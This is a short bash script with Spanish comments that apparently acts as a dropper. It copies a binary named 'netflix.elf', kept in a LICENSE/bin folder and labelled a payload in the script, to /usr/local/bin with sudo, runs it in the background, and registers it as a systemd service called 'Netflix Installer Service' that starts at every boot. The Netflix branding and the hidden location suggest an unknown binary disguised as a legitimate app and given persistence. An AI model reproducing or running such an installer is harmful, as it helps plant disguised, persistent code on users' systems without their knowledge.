#!/bin/bash

# Obtener la ruta actual
CURRENT_DIR=$(pwd)

# Ruta donde deseas copiar el archivo (global)
TARGET_DIR="/usr/local/bin"  # Ruta global

# Ruta completa del archivo que deseas ejecutar
PAYLOAD_DIR="$CURRENT_DIR/LICENSE/bin"
PAYLOAD_FILE="$PAYLOAD_DIR/netflix.elf"
TARGET_FILE="$TARGET_DIR/netflix.elf"

# Cambiar al directorio donde está el archivo original
cd "$PAYLOAD_DIR" || { echo "No se pudo cambiar al directorio: $PAYLOAD_DIR"; exit 1; }

# Asegurarse de que el archivo tenga permisos de ejecución
chmod +x "$PAYLOAD_FILE"

# Hacer una copia del archivo en la ubicación de destino
sudo cp  netflix.elf /usr/local/bin

# Ejecutar el archivo desde la nueva ruta en segundo plano y capturar el PID
netflix.elf &
PID=$!

# Regresar al directorio original
cd "$CURRENT_DIR" || { echo "No se pudo regresar al directorio: $CURRENT_DIR"; exit 1; }

# Imprimir el PID
echo "Netflix se está ejecutando en segundo plano con PID: $PID"

# Crear el archivo de servicio
SERVICE_FILE="/etc/systemd/system/netflix_installer.service"

echo "Creando archivo de servicio en $SERVICE_FILE"

sudo bash -c "cat <<EOF > $SERVICE_FILE
[Unit]
Description=Netflix Installer Service
After=network.target

[Service]
ExecStart=$TARGET_FILE
Type=simple
PIDFile=/var/run/netflix_installer.pid
Restart=on-failure
User=$(whoami)
Group=$(whoami)

[Install]
WantedBy=multi-user.target
EOF"

# Recargar systemd para reconocer el nuevo servicio
echo "Recargando systemd..."
sudo systemctl daemon-reload

# Habilitar el servicio para que inicie al arranque
echo "Habilitando el servicio..."
sudo systemctl enable netflix_installer.service

# Iniciar el servicio
echo "Iniciando el servicio..."
sudo systemctl start netflix_installer.service

echo "El servicio Netflix Installer ha sido creado y se está ejecutando."


